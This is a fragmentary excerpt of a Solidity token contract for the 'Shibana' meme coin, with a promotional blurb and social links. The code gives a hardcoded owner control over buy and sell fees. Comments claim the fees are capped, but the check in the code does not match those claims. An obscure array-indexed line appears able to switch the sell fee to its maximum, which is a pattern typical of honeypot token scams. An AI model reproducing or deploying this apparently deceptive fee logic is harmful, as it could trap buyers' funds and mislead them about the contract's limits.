...
$SHIBANA is $SHINA's official cousin :cupid: embarking on a lovely journey to reduce community segregation and bring together the DeFi ecosystems through SHIBANA WORLD.


Telegram : https://t.me/ShibanaBSC

Website : https://medium.com/@ShibanaBSC

Twitter : https://twitter.com/ShibanaBSC
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xB53d9773A823213B7e66b2a3311552E4e2006B1E;
...
contract Shibana is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_marketing = payable(0x2ACEFf8c434B1a1E6f183F7b658cA62d7DE5a898);
    ...
    */
    ...
    string public _name = "Shibana"; 
    string public _symbol = "Shibana";  
    ...
    // This contract also cant set fee untill 100%
    ...
    */
    ...
    //If set fee 30% it will be reject by contract

    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {

        require((Buy_Fee + Sell_Fee) <= maxPossibleFee+1, "Fee is too high!");
        _sellFee = Sell_Fee;
        _buyFee = Buy_Fee;
    ...
    */
    ...
    _sellFee = [_previousSellFee, maxPossibleFee][_exTotalFee]; 
